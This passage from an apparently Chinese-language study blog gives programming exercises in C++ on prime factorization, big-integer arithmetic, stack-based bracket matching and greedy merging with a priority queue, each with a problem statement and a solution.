&gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n &lt; <span class="number">4</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line">		<span class="type">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line">		<span class="built_in">init</span>(m, primes);</span><br><span class="line">		<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; primes.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">			<span class="keyword">while</span>(n % primes[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				n /= primes[i];</span><br><span class="line">				cnt++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(n &gt; <span class="number">1</span>) cnt++;</span><br><span class="line">		cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="最大素因子">最大素因子</h3>
<h5 id="题目描述-8">题目描述</h5>
<p>对于给定的字符序列，从左至右将所有的数字字符取出拼接成一个无符号整数（字符序列长度小于100，拼接出的整数小于2^31,），计算并输出该整数的最大素因子（如果是素数，则其最大因子为自身）</p>
<h5 id="输入输出格式-6">输入输出格式</h5>
<h6 id="输入描述-8">输入描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">有多组数据，输入数据的第一行为一个正整数，表示字符序列的数目，每组数据为一行字符序列。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-8">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对每个字符序列，取出所得整数的最大素因子，若字符序列中没有数字或者找出的整数为0，则输出0，每个整数占一行输出。</span><br></pre></td></tr></table></figure>
<p>先处理字符串获得数字n，再得到&amp;&amp;\sqrt(n)&amp;&amp;以内的素数，然后遍历一遍得到最大素数；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="type">bool</span> isp[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!isp[i])&#123;</span><br><span class="line">			primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">			<span class="type">int</span> p = primes[j];</span><br><span class="line">			<span class="keyword">if</span>(p * i &gt; n)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			isp[p*i] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(i % p == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deal_str</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> len = s.<span class="built_in">size</span>(), r = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="type">int</span> tmp = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(tmp &gt;= <span class="number">0</span> &amp;&amp; tmp &lt;= <span class="number">9</span>)&#123;</span><br><span class="line">			r = r*<span class="number">10</span> + tmp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		string s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; s;</span><br><span class="line">			<span class="type">int</span> n = <span class="built_in">deal_str</span>(s);</span><br><span class="line">			<span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">				cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line">			vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line">			<span class="built_in">init</span>(m, primes);</span><br><span class="line">			<span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">				<span class="keyword">while</span>(n % primes[j] == <span class="number">0</span>)&#123;</span><br><span class="line">					n /= primes[j];</span><br><span class="line">					<span class="keyword">if</span>(primes[j] &gt; p) p = primes[j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(n != <span class="number">1</span> &amp;&amp; n &gt; p) p = n;</span><br><span class="line">			cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="精度">精度</h1>
<h2 id="大整数加法">大整数加法</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(a, b)  (a &gt; b ? a:b)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min(a, b)  (a &lt; b ? a:b)</span></span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">add</span><span class="params">(string a, string b)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n1 = a.<span class="built_in">size</span>(), n2 = b.<span class="built_in">size</span>();</span><br><span class="line">	string r;</span><br><span class="line">	<span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n2; i++)&#123;</span><br><span class="line">		<span class="type">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + (b[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">		r += (tmp)	% <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		k = tmp / <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = n2; i &lt; n1; i++)&#123;</span><br><span class="line">		<span class="type">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">		r += tmp % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		k = tmp / <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(k) r += k+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">		string  r;</span><br><span class="line">		<span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line">		<span class="built_in">reverse</span>(b.<span class="built_in">begin</span>(), b.<span class="built_in">end</span>());</span><br><span class="line">		<span class="keyword">if</span>(a.<span class="built_in">size</span>() &gt; b.<span class="built_in">size</span>())&#123;</span><br><span class="line">			r = <span class="built_in">add</span>(a, b);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			r = <span class="built_in">add</span>(b, a);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">reverse</span>(r.<span class="built_in">begin</span>(), r.<span class="built_in">end</span>());</span><br><span class="line">		cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="大整数乘法">大整数乘法</h2>
<p>先变成数字的数组，再算，然后进位</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#include&lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="keyword">using</span> namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	string a, b;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">		reverse(a.<span class="keyword">begin</span>(), a.<span class="keyword">end</span>());</span><br><span class="line">		reverse(b.<span class="keyword">begin</span>(), b.<span class="keyword">end</span>());</span><br><span class="line">		<span class="type">int</span> aa[<span class="number">105</span>], bb[<span class="number">105</span>], r[<span class="number">210</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			aa[i] = a[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			bb[i] = b[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">				r[i+j] += aa[i] * bb[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> len = <span class="number">2</span>*n;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">			r[i] += r[i<span class="number">-1</span>] / <span class="number">10</span>;</span><br><span class="line">			r[i<span class="number">-1</span>] %= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(!r[len]) len<span class="comment">--;</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = len; i &gt;= <span class="number">0</span>; i<span class="comment">--)&#123;</span></span><br><span class="line">			cout &lt;&lt; r[i];</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="数据结构">数据结构</h1>
<h2 id="栈">栈</h2>
<p><code>#include&lt;stack\&gt; 然后可以直接用了，常用的方法有.push .pop .top .empty</code></p>
<h3 id="括号匹配">括号匹配</h3>
<h5 id="题目描述-9">题目描述</h5>
<p>假设表达式中允许包含两种括号:圆括号和方括号。编写一个算法判断表达式中的括号是否正确配对。</p>
<h5 id="输入输出格式-7">输入输出格式</h5>
<h6 id="输入描述-9">输入描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">由括号构成的字符串，包含”（“、”）“、”<span class="selector-attr">[“和”]</span>“。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-9">输出描述:</h6>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">如果匹配输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span>。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">		stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">				<span class="type">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>&amp;&amp;now == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;]&#x27;</span>&amp;&amp;now == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">					st.<span class="built_in">pop</span>();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="括号的匹配">括号的匹配</h3>
<h5 id="题目描述-10">题目描述</h5>
<p><code>题意描述： 在算术表达式中，除了加、减、乘、除等运算外，往往还有括号。包括有大括号&#123;&#125;，中括号[]，小括号()，尖括号&lt;&gt;等。 对于每一对括号，必须先左边括号，然后右边括号；如果有多个括号，则每种类型的左括号和右括号的个数必须相等；对于多重括号的情形，按运算规则，从外到内的括号嵌套顺序为：大括号-&gt;中括号-&gt;小括号-&gt;尖括号。例如，&#123;[()]&#125;，&#123;()&#125;,&#123;&#123;&#125;&#125;为一个合法的表达式，而([&#123;&#125;])，&#123;([])&#125;,[&#123;&lt;&gt;&#125;]都是非法的。</code></p>
<h5 id="输入输出格式-8">输入输出格式</h5>
<h6 id="输入描述-10">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">文件的第一行为一个整数<span class="built_in">n</span>（<span class="number">1</span>≤<span class="built_in">n</span>≤<span class="number">100</span>），接下来有<span class="built_in">n</span>行仅由上述四类括号组成的括号表达式。第i+<span class="number">1</span>行表示第i个表达式。每个括号表达式的长度不超过<span class="number">255</span>。</span><br></pre></td></tr></table></figure>
<p>和上一题比较像，只不过给括号之间加入了优先级，判断一下就行</p>
<h6 id="输出描述-10">输出描述:</h6>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">在输出文件中有<span class="built_in">N</span>行，其中第<span class="built_in">I</span>行对应第<span class="built_in">I</span>个表达式的合法性，合法输出<span class="variable">YES</span>，非法输出<span class="variable">NO</span>。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			string s;</span><br><span class="line">			cin &gt;&gt; s;</span><br><span class="line">			stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">					<span class="type">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line">					<span class="keyword">if</span>(now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;(&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span> || s[j] == <span class="string">&#x27;&#123;&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span>(now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;&#123;&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">if</span>(now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span>(now == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#125;&#x27;</span> || now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;]&#x27;</span> ||now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;)&#x27;</span> ||now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&gt;&#x27;</span>)&#123;</span><br><span class="line">						st.<span class="built_in">pop</span>();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="括号匹配问题">括号匹配问题</h3>
<h5 id="题目描述-11">题目描述</h5>
<p>在某个字符串（长度不超过100）中有左括号、右括号和大小写字母；规定（与常见的算数式子一样）任何一个左括号都从内到外与在它右边且距离最近的右括号匹配。写一个程序，找到无法匹配的左括号和右括号，输出原来字符串，并在下一行标出不能匹配的括号。不能匹配的左括号用"$"标注,不能匹配的右括号用"?"标注。</p>
<h5 id="输入输出格式-9">输入输出格式</h5>
<h6 id="输入描述-11">输入描述:</h6>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">输入包括多组数据，每组数据一行，包含一个字符串，只包含左右括号和大小写字母，字符串长度不超过<span class="number">100</span>。</span><br><span class="line">注意：cin.getline(<span class="built_in">str</span>,<span class="number">100</span>)最多只能输入<span class="number">99</span>个字符！</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-11">输出描述:</h6>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">对每组输出数据，输出两行，第一行包含原始输入字符，第二行由<span class="string">&quot;<span class="variable">$</span>&quot;</span>,<span class="string">&quot;?&quot;</span>和空格组成，<span class="string">&quot;<span class="variable">$</span>&quot;</span>和<span class="string">&quot;?&quot;</span>表示与之对应的左括号和右括号不能匹配。</span><br></pre></td></tr></table></figure>
<p>先正序，再倒序入栈</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">		<span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> tag[len] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">				st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">					tag[i] = <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.<span class="built_in">pop</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        	st.<span class="built_in">pop</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; s&lt;&lt; endl;</span><br><span class="line">		<span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">				st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">					tag[len - <span class="number">1</span> - i] = <span class="number">2</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.<span class="built_in">pop</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tag[i] == <span class="number">0</span>)&#123;</span><br><span class="line">				cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(tag[i] == <span class="number">1</span>)&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;?&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;$&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="哈夫曼树">哈夫曼树</h2>
<h3 id="合并果子">合并果子</h3>
<h5 id="题目描述-12">题目描述</h5>
<p>在一个果园里，多多已经将所有的果子打了下来，而且按果子的不同种类分成了不同的堆。多多决定把所有的果子合成一堆。
每一次合并，多多可以把两堆果子合并到一起，消耗的体力等于两堆果子的重量之和。可以看出，所有的果子经过n-1次合并之后，就只剩下一堆了。多多在合并果子时总共消耗的体力等于每次合并所耗体力之和。
因为还要花大力气把这些果子搬回家，所以多多在合并果子时要尽可能地节省体力。假定每个果子重量都为1，并且已知果子的种类数和每种果子的数目，你的任务是设计出合并的次序方案，使多多耗费的体力最少，并输出这个最小的体力耗费值。
例如有3种果子，数目依次为1，2，9。可以先将1、2堆合并，新堆数目为3，耗费体力为3。接着，将新堆与原先的第三堆合并，又得到新的堆，数目为12，耗费体力为12。所以多多总共耗费体力=3+12=15。可以证明15为最小的体力耗费值。</p>
<h5 id="输入输出格式-10">输入输出格式</h5>
<h6 id="输入描述-12">输入描述:</h6>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">输入包括两行，第一行是一个整数<span class="built_in">n</span>(<span class="number">1</span>&lt;＝n&lt;=<span class="number">10000</span>)，表示果子的种类数。第二行包含n个整数，用空格分隔，第<span class="selector-tag">i</span>个整数<span class="built_in">ai</span>(<span class="number">1</span>&lt;＝ai&lt;=<span class="number">20000</span>)是第<span class="selector-tag">i</span>种果子的数目。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-12">输出描述:</h6>
<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">输出包括一行，这一行只包含一个整数，也就是最小的体力耗费值。输入数据保证这个值小于</span><span class="number">2</span><span class="keyword">^31</span><span class="language-xml">。</span></span><br></pre></td></tr></table></figure>
<p>题目很容易看出贪心策略：每次只合并最小的两堆</p>
<p>但是每次合并后的堆还要放回去，得保证放回去后数据依旧有序</p>
<p>这里介绍一种数据结构：优先队列，头文件#include
<code>&lt;queue&gt;</code></p>
<p>这个队列弹出元素不是按照入队的先后，而是按照权值的大小出队。</p>
<p>定义：</p>
<p>priority_queue <code>&lt;int&gt;</code> q;
定义队列q，权值大的先出队</p>
<p>priority_queue &lt;int, vector <code>&lt;int&gt;</code>, greater
<code>&lt;int&gt;</code> &gt; q;权值小的先出队</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line">	<span class="type">int</span> a, ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		cin &gt;&gt; a;</span><br><span class="line">		q.<span class="built_in">push</span>(a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="type">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="type">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="type">int</span> t = t1 + t2;</span><br><span class="line">		q.<span class="built_in">push</span>(t);</span><br><span class="line">		ans += t;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实还有一种写法，自己定义节点和操作</p>
